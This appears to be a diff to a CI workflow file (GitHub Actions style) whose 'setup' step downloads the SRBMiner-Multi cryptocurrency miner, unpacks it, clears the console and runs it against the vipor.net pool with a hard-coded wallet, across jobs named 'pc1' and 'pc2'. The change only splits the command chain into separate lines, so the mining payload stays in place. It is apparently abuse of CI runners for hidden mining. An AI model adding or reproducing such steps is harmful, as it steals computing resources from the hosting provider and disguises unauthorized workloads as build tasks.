@@ -10,7 +10,15 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc1 --password x --cpu-threads 4
+          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz 
+          
+          tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz 
+          
+          clear 
+          
+          cd SRBMiner-Multi-2-6-7 
+          
+          ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc1 --password x --cpu-threads 4
 
   pc2:
     name: "pc2"
